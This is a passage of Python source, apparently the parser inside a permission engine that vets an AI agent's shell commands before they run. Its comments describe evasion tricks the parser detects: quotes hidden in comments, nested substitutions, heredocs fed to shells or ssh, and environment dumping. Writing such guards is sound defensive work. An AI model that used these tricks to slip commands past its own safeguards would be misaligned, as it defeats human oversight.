    an interpreter dumping the whole environment. Not hardlines (a legitimate task does these), but nobody is asked
    on the model's behalf: auto mode stops and asks, an unattended run is refused; yolo, which asks nothing, is not
    consulted. ``parsed`` is the parse :func:`check_parse` returned."""
    try:
        return _human_parsed(parsed, {})
    except _TooDeep:
        return None  # check_parse refused such a line before this ran


@dataclass
class Heredoc:
    """A heredoc fed to a command. Its body is data when the delimiter is quoted; an unquoted body is expanded by the
    shell, so the ``$(...)`` and backtick ``payloads`` in it run."""

    body: str
    quoted: bool
    payloads: list[str] = field(default_factory=list)


@dataclass
class Parsed:
    """A shell command line taken apart: the top-level simple commands and everything nested inside them."""

    subs: list[str] = field(default_factory=list)  # split on && || ; | & |& newline ( ), quote-aware
    nested: list[str] = field(default_factory=list)  # inside $(...), `...`, <(...), sh -c "...", eval, ssh (flat)
    #: an open quote, $(, <( or backtick at the end: what the shell does with the rest is not what we parsed
    unterminated: bool = False
    #: a comment that contains a quote character (an old trick to hide the next line inside a "quote")
    comment_quote: bool = False
    #: a comment with a quote character that ends the text (``npm test  # don't watch``): nothing follows it to hide,
    #: so it does not count as comment_quote at the top level (see _scan; a nested payload's still counts, see parse)
    tail_comment_quote: bool = False
    pipelines: list[list[str]] = field(default_factory=list)  # the subs grouped by | and |&
    clean: str = ""  # the line without comments, line continuations and heredoc bodies (what the regexes see)
    #: $(...)/`...`/<(...) payloads per sub, those of its unquoted heredoc bodies included
    sub_payloads: list[list[str]] = field(default_factory=list)
    heredocs: list[list[Heredoc]] = field(default_factory=list)  # per sub: the heredocs fed to it
    #: per sub: "shell" or "other" when an interpreter runs a heredoc fed to it as its program, the sub itself
    #: (``bash <<EOF``) or a later stage of its pipeline (``cat <<EOF | sh``); "" otherwise
    code_heredoc: list[str] = field(default_factory=list)
    #: per sub: the ``ssh host`` stages of its pipeline that run a heredoc fed to it as a script on that host
    remote_heredoc: list[list[str]] = field(default_factory=list)
    open_heredoc: bool = False  # a heredoc with no line after it to start its body
    open_bracket: bool = False  # a ${, [, a=( ... still open at the end (see _scan)
    #: nested deeper than the parser follows (_SCAN_MAX_DEPTH, parse): what runs in there was never read as commands
    too_deep: bool = False
    children: list[Parsed] = field(default_factory=list)  # the parsed payloads
    #: per child: the indices of the subs it came from (a payload of theirs, the heredoc fed to one): the child runs in
    #: the directories that sub may run in (see _check_parsed)
    child_subs: list[list[int]] = field(default_factory=list)


_LINE_END = re.compile(r"[ \t]*(?:\n|$)")

#: a cap on the total characters ``_match_paren`` scans in one top-level ``parse`` (shared by every nested scan, so
#: substitutions, quotes and arithmetic cannot multiply it); past it an open ``(`` is left unresolved (the command is
#: unterminated) instead of rescanning quadratically, and ``check`` denies the command (``scan-budget``)
_SCAN_BUDGET = 100_000

#: how deep ``_scan`` follows nested ``$(...)``/backticks before it stops and marks the command unterminated and too
#: deep (``check`` denies it: ``scan-depth``). Real commands nest a handful deep; a long run of substitutions bash
#: never closes is what reaches this (``parse`` stops at _PARSE_MAX_DEPTH, so deeper payloads are denied anyway).
_SCAN_MAX_DEPTH = 24

#: how many levels of nested commands ``parse`` reads (``$(...)``, ``bash -c``, ``eval``, a heredoc a shell runs ...);
#: a command with more than that is too deep and ``check`` denies it (``scan-depth``)
_PARSE_MAX_DEPTH = 6


def _match_paren(text: str, open_idx: int, arith: bool | None = None, budget: list[int] | None = None) -> int:
    """Index of the ``)`` that closes the ``(`` at ``open_idx`` (quote, escape, comment and heredoc aware); -1 when
    unbalanced. In arithmetic (``arith``; by default when the text there is ``((``) a ``<<`` is a shift and a ``#``
    starts no comment."""
    depth, i, n = 0, open_idx, len(text)
    heredocs: list[HeredocWord] = []
    if arith is None:
        arith = text.startswith("((", open_idx)  # $((...)): a << in it is a shift
    while i < n:
        if budget is not None and budget[0] < 0:
            return -2  # scanned too far already: the caller treats the ((...)) as unresolved
        start = i
        if text[i] == "\\":
            i += 2
        elif text[i] == "'":
            j = text.find("'", i + 1)
            if j < 0:
                return -1
            i = j + 1
        elif text[i] == '"':
            i += 1
            while i < n and text[i] != '"':
                i += 2 if text[i] == "\\" else 1
            if i >= n:
                return -1
            i += 1
        elif text.startswith("<<<", i):
            i += 3
        elif text.startswith("<<", i) and not arith:
            i, heredoc = _heredoc_word(text, i)
            if heredoc is None:
                return -1  # where the body ends is unknown
            heredocs.append(heredoc)
        elif text[i] == "\n" and heredocs:
            i = _skip_heredoc_bodies(text, i + 1, heredocs)
        elif text[i] == "#" and not arith and i > open_idx and text[i - 1] in " \t\n;&|()<>":
            eol = text.find("\n", i)
            i = n if eol < 0 else eol
        else:
            if text[i] == "(":
                depth += 1
            elif text[i] == ")":
                depth -= 1
                if depth == 0:
                    return i
            i += 1
        if budget is not None:
            budget[0] -= (i - start) or 1  # charge the characters scanned, quote/comment/heredoc jumps included
    return -1


def _arith_end(text: str, i: int, budget: list[int] | None = None) -> int:
    """Index of the last ``)`` of the arithmetic command ``((...))`` at ``i``, where ``<<`` is a shift, or -1 when it
    is not one: as in bash, the inner ``(`` must close right before a ``)`` (``((a) )`` is two subshells)."""
    inner = _match_paren(text, i + 1, arith=True, budget=budget)
    if inner == -2:
        return -2
    return inner + 1 if inner > 0 and text.startswith(")", inner + 1) else -1


def _scan(text: str, budget: list[int] | None = None, _depth: int = 0) -> Parsed:
    """Quote-aware split into simple commands and pipelines, plus the payloads of the substitutions found on the way.
    ``#`` starts a comment only at the start of a word outside quotes; ``\\<newline>`` joins lines; ``<<`` starts a
    heredoc only outside quotes and outside an open ``((...))``, ``${...}``, ``$[...]``, ``[...]`` or ``a=(...)``,
    however far back it opened (its body is not commands; the substitutions in an unquoted body are payloads of the
    command it is fed to). In ``((...))`` a ``<<`` is a shift; one that bash may not read as a heredoc, or whose body
    end bash may see elsewhere (in the other brackets, an odd delimiter word), makes the command unterminated and the
    next lines stay commands."""
    out = Parsed()
    if _depth > _SCAN_MAX_DEPTH:
        # too deeply nested to resolve: stop here rather than recurse further. What runs in there is unknown, so the
        # command is too deep (check denies it), and open_bracket makes the enclosing substitution unsure.
        out.unterminated = out.open_bracket = out.too_deep = True
        out.clean = text
        return out
    cur: list[str] = []
    cur_payloads: list[str] = []
    clean: list[str] = []
    pipe: list[str] = []
    heredocs: list[HeredocWord] = []  # the heredocs started on this line
    heredoc_info: list[tuple[bool, int]] = []  # per delimiter: quoted, index of the sub it is fed to
    # the open brackets, innermost last: "((" (with the index of its last ")"), "${", "{" (inside "${"), "[" (also for
    # "$["), "=(" and "=(!" (an a=(...) with an operator in it), "$(" (a substitution whose payload ends in an open
    # bracket); the last two never close. A closer that does not match the innermost is ignored, so an unsure bracket
    # stays open: a << then needs a person instead of hiding the next lines
    ctx: list[tuple[str, int]] = []
    i, n = 0, len(text)
    if budget is None:
        budget = [_SCAN_BUDGET]  # top-level call: one budget shared with every nested scan below

    def emit(s: str) -> None:
        cur.append(s)
        clean.append(s)

    def flush(sep: str, piped: bool = False) -> None:
        nonlocal pipe
        part = "".join(cur).strip()
        if part:
            out.subs.append(part)
            out.sub_payloads.append(list(cur_payloads))
            out.heredocs.append([])
            pipe.append(part)
        elif piped and not pipe and out.pipelines:
            pipe = out.pipelines.pop()  # `(a) | b`: the subshell feeds b
        cur.clear()
        cur_payloads.clear()
        if not piped and pipe:
            out.pipelines.append(pipe)
            pipe = []
        clean.append(sep)

    def subst(at: int, open_len: int) -> tuple[int, str]:
        """``$(``, ``<(`` or ``>(`` at ``at``: (index after the closing paren, cleaned text)."""
        end = _match_paren(text, at + open_len - 1, budget=budget)
        if end < 0:  # unbalanced, or past the scan budget: the substitution is unterminated
            out.unterminated = True
            end = n
        payload = _subst_payload(text, at, end)
        cur_payloads.append(payload)
        inner = _scan(payload, budget, _depth + 1)
        out.too_deep = out.too_deep or inner.too_deep
        # `$(cat <<EOF)`: bash reads the body from the lines after the substitution
        out.unterminated = out.unterminated or inner.open_heredoc
        if inner.open_bracket:
            # `$(a[)...`: bash reads on past a ) in a bracket, so where the substitution ends is unsure
            out.unterminated = True
            ctx.append(("$(", -1))
        return end + 1, text[at : at + open_len] + inner.clean.strip() + ")"

    def backtick(at: int, dquoted: bool = False) -> tuple[int, str]:
        """`` ` `` at ``at``: (index after the closing backtick, cleaned text). bash runs the payload unescaped."""
        end = _backtick_end(text, at)
        if end < 0:
            out.unterminated = True
            end = n
        payload = _unescape_backticks(text[at + 1 : end], dquoted)
        # the text up to the next backtick, escaped or not, is read too, as before the unescaping, and the scan goes on
        # from there (an earlier or equal point than ``end``): it holds no backtick, so it adds one flat scan per
        # backtick and no nesting, and the text after it is still read as commands
        first = text.find("`", at + 1)
        upto_next = text[at + 1 : n if first < 0 else first]
        for p in dict.fromkeys([payload, upto_next]):
            cur_payloads.append(p)
            # the scan goes on inside and after the backtick, so a payload is read twice (and again at every level
            # of nesting): its characters are charged to the budget, and past it the command is denied (check)
            budget[0] -= len(p) or 1
            if budget[0] < 0:
                break
            inner_bt = _scan(p, budget, _depth + 1)
            out.too_deep = out.too_deep or inner_bt.too_deep
            out.unterminated = out.unterminated or inner_bt.open_heredoc or inner_bt.open_bracket
        end = n if first < 0 else min(end, first)
        return end + 1, text[at : end + 1]

    while i < n:
        while ctx and ctx[-1][0] == "((" and i > ctx[-1][1]:
            ctx.pop()  # past the )) of an arithmetic command
        c = text[i]
        if ctx and ctx[-1][0] == "=(" and (c in ";|&" or (c in "<>" and text[i + 1 : i + 2] != "(")):
            ctx[-1] = ("=(!", -1)  # an operator in a=(...): bash drops the rest of the line, heredocs included
        if c == "\\" and i + 1 < n:
            if text[i + 1] != "\n":  # \<newline> is a line continuation: both go
                emit(text[i : i + 2])
            i += 2
        elif c == "'":
            j = text.find("'", i + 1)
            if j < 0:
                out.unterminated = True
                j = n - 1
            emit(text[i : j + 1])
            i = j + 1
        elif c == '"':
            piece, j, closed = ['"'], i + 1, False
            while j < n:
                d = text[j]
                if d == '"':
                    closed, j = True, j + 1
                    break
                if d == "\\" and j + 1 < n:
                    if text[j + 1] != "\n":
                        piece.append(text[j : j + 2])
                    j += 2
                elif text.startswith("$(", j):
                    j, s = subst(j, 2)
                    piece.append(s)
                elif d == "`":
                    j, s = backtick(j, dquoted=True)
                    piece.append(s)
                else:
                    piece.append(d)
                    j += 1
            if closed:
                piece.append('"')
            else:
                out.unterminated = True
            emit("".join(piece))
            i = j
        elif c == "#" and (not cur or (len(cur[-1]) == 1 and cur[-1] in " \t<>&")):
            eol = text.find("\n", i)
            eol = n if eol < 0 else eol
            if any(q in text[i:eol] for q in "'\"`"):
                # A quote only hides something when text follows the comment: a shell that did not take the `#` as
                # a comment would read the quote as opening a string that swallows the next lines. In a comment that
                # ends the text (no open bracket either) it would only open a string that never closes: a syntax
                # error, and the shell runs nothing of that line. Such a comment is recorded apart, and parse()
                # counts it only where the text goes on after it (a $(...) payload, a `bash -c` string).
                if text[eol:].strip() or ctx:
                    out.comment_quote = True
                else:
                    out.tail_comment_quote = True
            i = eol
        elif text.startswith(("$(", "<(", ">("), i):
            i, s = subst(i, 2)
            emit(s)
        elif text.startswith(("${", "$["), i):
            ctx.append(("${" if text[i + 1] == "{" else "[", -1))
            emit(text[i : i + 2])
            i += 2
        elif c in "[]{}":
            top = ctx[-1][0] if ctx else ""
            if c == "[" or (c == "{" and top in ("${", "{")):  # a bare { opens nothing outside ${...}
                ctx.append((c, -1))
            elif (c == "]" and top == "[") or (c == "}" and top in ("${", "{")):
                ctx.pop()
            emit(c)
            i += 1
        elif c == "`":
            i, s = backtick(i)
            emit(s)
        elif text.startswith("<<<", i):
            emit("<<<")
            i += 3
        elif text.startswith("<<", i) and ctx:
            # in ((...)) a shift; in the other brackets bash reads no heredoc either (or fails on the line), but where
            # its word or line ends is unsure, and so is a shift at the end of a line (a heredoc with no word outside)
            if any(kind != "((" for kind, _ in ctx) or _LINE_END.match(text, i + 2):
                out.unterminated = True
            emit("<<")
            i += 2
        elif text.startswith("<<", i):
            end, heredoc = _heredoc_word(text, i)
            if heredoc:
                heredocs.append(heredoc)
                heredoc_info.append((heredoc[2], len(out.subs)))  # the sub being built gets this index
                emit(text[i:end])
                i = end
            else:
                out.unterminated = True
                emit("<<")
                i += 2
        elif c == "\n":
            flush("\n")
            if heredocs and ctx:
                # `cat <<EOF ${x:-<newline>...}`: bash reads the body after the line the bracket closes on; the next
                # lines stay commands
                out.unterminated = True
                heredocs.clear()
                heredoc_info.clear()
            bodies: list[str] = []
            i = _skip_heredoc_bodies(text, i + 1, heredocs, bodies)
            for (quoted, k), body in zip(heredoc_info, bodies, strict=True):
                payloads, open_ = ([], False) if quoted else _body_payloads(body, budget)
                out.heredocs[k].append(Heredoc(body, quoted, payloads))
                out.sub_payloads[k].extend(payloads)
                out.unterminated = out.unterminated or open_
            heredoc_info.clear()
        elif text[i : i + 2] in ("&&", "||"):
            flush(text[i : i + 2])
            i += 2
        elif text[i : i + 2] == "|&":
            flush("|&", piped=True)
            i += 2
        elif c == "|":
            flush("|", piped=True)
            i += 1
        elif c == ";":
            flush(";")
            i += 1
        elif c == "&":
            prev = text[i - 1] if i else ""
            nxt = text[i + 1] if i + 1 < n else ""
            if prev in "<>" or nxt == ">":  # 2>&1, >&2, &>file: part of a redirection
                emit(c)
            else:
                flush("&")  # a lone & backgrounds the command; what follows is another command
            i += 1
        elif c in "()":
            top = ctx[-1][0] if ctx else ""
            if c == "(":
                if top == "=(":
                    ctx[-1] = ("=(!", -1)
                elif cur and cur[-1] == "=":
                    ctx.append(("=(", -1))  # a=(...), also a=((...)): no arithmetic
                elif top != "((" and text.startswith("((", i):
                    end = _arith_end(text, i, budget)
                    if end == -2:  # too long to resolve: an open (( that never closes, so the command is unterminated
                        out.unterminated = True
                        ctx.append(("((", n))
                    elif end > 0:
                        ctx.append(("((", end))
            elif top == "=(":
                ctx.pop()
            flush(c)
            i += 1
        else:
            emit(c)
            i += 1
    flush("")
    out.open_heredoc = bool(heredocs)
    out.open_bracket = any(kind != "((" or end >= n for kind, end in ctx)
    out.clean = "".join(clean)
    try:
        out.code_heredoc, out.remote_heredoc = _code_heredocs(out)
    except _TooDeep:  # a stage that alternates wrappers and reserved words endlessly (see _command_argv)
        out.code_heredoc, out.remote_heredoc = [""] * len(out.subs), [[] for _ in out.subs]
        out.too_deep = True
    return out


_REDIRECT_WORD = re.compile(r"(?:\d*|&)(?:<<?<?|>>?|<>|[<>]&)")


def _without_redirects(words: list[str]) -> list[str]:
    """``words`` without the redirections (``<<EOF``, ``2>&1``, ``> out``, ``<<< text``): a redirect is not the script
    operand of ``bash <<EOF``."""
    out: list[str] = []
    skip = False
    for word in words:
        if skip:
            skip = False
            continue
        m = _REDIRECT_WORD.match(word)
        if m:
            skip = m.end() == len(word)  # a lone operator takes the next word as its target
        else:
            out.append(word)
    return out


def _ssh_command(args: list[str]) -> list[str]:
    """The remote command of ``ssh`` with arguments ``args`` ([] when there is none). Like ssh: options also after the
    host name, ``--`` ends them."""
    host, i = False, 0
    while i < len(args):
        a = args[i]
        i += 1
        if a == "--":
            return args[i:] if host else args[i + 1 :]
        if a.startswith("-") and len(a) > 1:
            for k, ch in enumerate(a[1:], 1):
                if ch in SSH_VALUE_OPTS["ssh"]:
                    i += 0 if a[k + 1 :] else 1
                    break
        elif host:
            return args[i - 1 :]
        else:
            host = True
    return []


def _stdin_program(stage: str) -> str:
    """ "shell" or "other" when ``stage`` is an interpreter that executes its stdin as a program (``bash``,
    ``python3 -``, ``sudo sh -s``, ``ssh host`` with no command: the remote login shell), else ""."""
    argv = _command_argv(_without_redirects(_tokens(stage)))
    if argv[:1] == ["ssh"]:
        remote = _ssh_command(argv[1:])
        return _stdin_program(" ".join(remote)) if remote else "shell"
    if not (argv and _is_interpreter(argv[0]) and _runs_stdin_as_code(argv)):
        return ""
    return "shell" if argv[0] in _SHELLS or argv[0] in ("source", ".") else "other"


def _code_heredocs(parsed: Parsed) -> tuple[list[str], list[list[str]]]:
    """Per sub: what runs a heredoc fed to it as a program, the sub itself or a later stage of its pipeline, and the
    ssh stages among them (see Parsed.code_heredoc, Parsed.remote_heredoc)."""
    out = [""] * len(parsed.subs)
    remote: list[list[str]] = [[] for _ in parsed.subs]
    if not any(parsed.heredocs):
        return out, remote
    base = 0  # the pipelines list the subs in order
    for stages in parsed.pipelines:
        runs = [_stdin_program(s) for s in stages]
        argvs = [_command_argv(_without_redirects(_tokens(s))) for s in stages]
        ssh = [shlex.join(a) if a[:1] == ["ssh"] and r == "shell" else "" for a, r in zip(argvs, runs, strict=True)]
        for k in range(len(stages)):
            if parsed.heredocs[base + k]:
                out[base + k] = "shell" if "shell" in runs[k:] else next((r for r in runs[k:] if r), "")
                remote[base + k] = [s for s in ssh[k:] if s]
        base += len(stages)
    return out, remote


def _trap_actions(args: list[str]) -> list[str]:
    """The action strings of ``trap`` with arguments ``args``: shell that runs later (at exit, on a signal, on
    ERR/DEBUG), so each is read like a ``bash -c`` payload. The shells disagree on what an option is: bash takes
    ``-l``/``-p``/``-P`` and fails on any other ``-x``, dash and ash fail on any ``-x``, and a ``+x`` word is the action
    in all three; zsh reads every first word but ``--`` as the action. Both readings are returned (reading one too
    many is safe). Nothing for ``trap -l``/``-p`` in bash, a lone ``-`` (resets the traps) or an empty action."""
    out: list[str] = []
    i = 0
    while i < len(args) and len(args[i]) > 1 and args[i].startswith("-") and args[i] != "--":
        i += 1
    letters = "".join(a[1:] for a in args[:i])
    if i < len(args) and args[i] == "--":
        i += 1
    if not set(letters) & set("lp") and i < len(args):
        out.append(args[i])
    first = args[1:] if args[:1] == ["--"] else args
    if first:
        out.append(first[0])
    return [a for a in dict.fromkeys(out) if a not in ("", "-")]


#: Shell options that take the next word as their value (``bash -o pipefail -c ...``, ``--rcfile FILE``).
_SHELL_VALUE_OPTS = frozenset({"-o", "+o", "-O", "+O", "--rcfile", "--init-file"})


def _shell_c_code(argv: list[str]) -> list[str]:
    """The command string of a shell run with ``-c`` (``sh -c CMD``, ``bash -lc CMD``, ``bash -o pipefail -c CMD``):
    the first word after the options, when an option cluster has a ``c``; else nothing. A cluster ending in ``o``/``O``
    takes the next word as its value (``bash -euo pipefail -c CMD``); fish also takes ``--command CMD`` (any prefix of
    it down to ``--c``, as its getopt does) and ``--command=CMD``."""
    code, i = False, 1
    while i < len(argv) and argv[i][:1] in ("-", "+") and len(argv[i]) > 1:
        a = argv[i]
        if a == "--":
            i += 1
            break
        key, eq, value = a.partition("=")
        if argv[0] == "fish" and len(key) >= 3 and "--command".startswith(key):
            return [value] if eq else argv[i + 1 : i + 2]
        code = code or (a[0] == "-" and not a.startswith("--") and "c" in a[1:])
        i += 2 if a in _SHELL_VALUE_OPTS or (not a.startswith("--") and a[-1] in "oO") else 1
    return [argv[i]] if code and i < len(argv) else []


def _launcher_payloads(sub: str) -> list[str]:
    """Quoted arguments of ``bash -c``, ``ssh host "..."``, ``sudo sh -c ...``, the joined arguments of ``eval``, the
    action string of ``trap`` (see _trap_action), the values of ``ssh -oProxyCommand=...`` (see ssh_option_commands) and
    the command line of ``wsl.exe``, ``cmd.exe /c`` and ``powershell.exe -Command`` (see _windows_command_line):
    strings run as commands, unquoted as the shell unquotes them (see _shell_words). An unquoted ``${...}`` is read
    both as written and as the text its word gives (``bash -c ${x:+'`a`'}`` runs `` `a` ``), a ``${...}`` in double
    quotes both as written and with the backslashes the shell drops there removed (``bash -c "${x:+\\`a\\`}"`` runs
    `` `a` ``), every combination of the two, and shlex's reading is checked as well. Identical readings are one
    reading."""
    out: list[str] = []
    # the readings differ only in a ${...} unit: without one they are all the first, read once (a line of thousands of
    # simple commands is read once per command, see engine._secret_access)
    flags = [(u, e) for u in (False, True) for e in (True, False)] if "${" in sub else [(False, True)]
    readings = [tuple(_shell_words(sub, unquote, unescape)) for unquote, unescape in flags]
    for toks in dict.fromkeys([*readings, tuple(_tokens(sub))]):  # shlex's reading too, as before _shell_words
        pre = _strip_wrappers(_past_reserved(list(toks)))
        if len(pre) > 1 and os.path.basename(pre[0]) == "eval":
            out.append(" ".join(pre[1:]))
        real = _command_argv(list(toks))
        if real and _is_launcher_name(real[0]):
            out += [t for t in real[1:] if not t.startswith("-") and re.search(r"\s|[;&|$`<>()]", t)]
        if real and (real[0] in _SHELLS or real[0] == "ash"):
            out += _shell_c_code(real)  # `bash -c env`: one word with nothing to split is code all the same
        if real and real[0] == "trap":
            out += _trap_actions(real[1:])
        if real:
            out += ssh_option_commands(real[0], real[1:])
            out += _windows_command_line(real[0], real[1:])
    return list(dict.fromkeys(out))


def parse(command: str, _depth: int = 0, budget: list[int] | None = None) -> Parsed:
    """Split ``command`` into simple commands and collect every command nested inside it (recursively)."""
    if budget is None:
        budget = [_SCAN_BUDGET]  # one budget for the whole command, so nesting cannot multiply the paren scan
    parsed = _scan(command, budget)
    if budget[0] < 0 or parsed.too_deep:
        return parsed  # the parser gave up and check() denies the command: its nested commands are not read
    # each payload, read once, and the subs it came from (Parsed.child_subs), in the order they appear
    payloads: dict[str, list[int]] = {}
    for k, ps in enumerate(parsed.sub_payloads):
        for p in ps:
            payloads.setdefault(p, []).append(k)
    try:
        for k, sub in enumerate(parsed.subs):
            for p in _launcher_payloads(sub):
                payloads.setdefault(p, []).append(k)
    except _TooDeep:  # see _command_argv
        parsed.too_deep = True
        return parsed
    if _depth >= _PARSE_MAX_DEPTH:
        # pathological nesting is cut off: commands nested in here are never read, so the command is too deep
        parsed.too_deep = bool(payloads) or "shell" in parsed.code_heredoc
        return parsed
    # a unit is read in more than one way (see _scan, _body_payloads, _launcher_payloads), and each reading is a subtree
    # of its own, so the work would multiply with every level of nesting. An identical reading is parsed once, and the
    # characters of every reading but the first are charged to the shared budget: past it the command is denied
    # (``scan-budget``) instead of read twice over
    for n, (payload, origin) in enumerate(payloads.items()):
        if n:
            budget[0] -= len(payload) or 1
        if budget[0] < 0:
            return parsed
        inner = parse(payload, _depth + 1, budget)
        parsed.children.append(inner)
        parsed.child_subs.append(origin)
        parsed.nested.extend([*inner.subs, *inner.nested])
        parsed.unterminated = parsed.unterminated or inner.unterminated
        # the outer text goes on after a payload ($(...), `bash -c '...'`): a quote in its last comment still counts
        parsed.comment_quote = parsed.comment_quote or inner.comment_quote or inner.tail_comment_quote
        parsed.too_deep = parsed.too_deep or inner.too_deep
    # a heredoc a shell runs is its script (`bash <<'EOF'`, `cat <<EOF | sh`): checked like `bash -c "..."`, except for
    # its quotes (a stray one in a comment of a long script is not worth a prompt). The program of another
    # interpreter is not shell: such a heredoc is only kept out of the allowlist (see engine._decide_bash).
    for k, bodies in enumerate(parsed.heredocs):
        for heredoc in bodies if parsed.code_heredoc[k] == "shell" else ():
            inner = parse(heredoc.body, _depth + 1, budget)
            parsed.children.append(inner)
            parsed.child_subs.append([k])
            parsed.nested.extend([*inner.subs, *inner.nested])
            parsed.too_deep = parsed.too_deep or inner.too_deep
            # `ssh host <<EOF` runs the body on host: each command is also checked as `ssh host '<command>'`, the
            # spelling the rules about remote hosts match
            remote = [*inner.subs, *inner.nested]
            for ssh in parsed.remote_heredoc[k]:
                for c in remote:
                    parsed.children.append(_scan(f"{ssh} {shlex.quote(c)}", budget))
                    parsed.child_subs.append([k])
    return parsed


def split_commands(command: str) -> list[str]:
    """Split a shell command into simple commands (quote-aware: ``&&``, ``||``, ``;``, ``|``, ``&``, ``|&``,
    newlines and subshell parentheses split; quoted text, substitutions and heredoc bodies stay together)."""
    return parse(command).subs


def command_prefix(sub_command: str) -> str:
    """Narrowest arity prefix string for an ``always`` rule suggestion.

    ``git commit -m x`` -> ``"git commit"``; unknown commands -> first token.
    Flags never count: they are stripped before arity lookup, except python's ``-m MODULE``
    (``python -m pytest -q`` -> ``"python -m pytest"``, not ``"python pytest"``).
    """
    try:
        tokens = shlex.split(sub_command, posix=True)
    except ValueError:
        tokens = sub_command.split()
    while tokens and "=" in tokens[0] and tokens[0].split("=", 1)[0].isidentifier():
        tokens = tokens[1:]  # a leading VAR=value is not the command, and is often a secret
    python = bool(tokens) and tokens[0].startswith("python")
    tokens = [t for t in tokens if not t.startswith("-") or t in ("-", "--") or (python and t == "-m")]
    if not tokens:
        return ""
    from .arity import prefix

    return " ".join(prefix(tokens))


def is_launcher(sub_command: str) -> bool:
    """True when the command runs code given in its arguments (shells, ssh, interpreters, xargs, find, sudo ...)."""
    tokens = _tokens(sub_command)
    if tokens and _is_launcher_name(os.path.basename(tokens[0])):
        return True
    real = _strip_wrappers(tokens)
    return bool(real) and _is_launcher_name(os.path.basename(real[0]))


#: Shell tokenising for the engine's argument checks (quote-aware, wrappers such as sudo/env stripped).
tokens = _tokens
strip_wrappers = _strip_wrappers
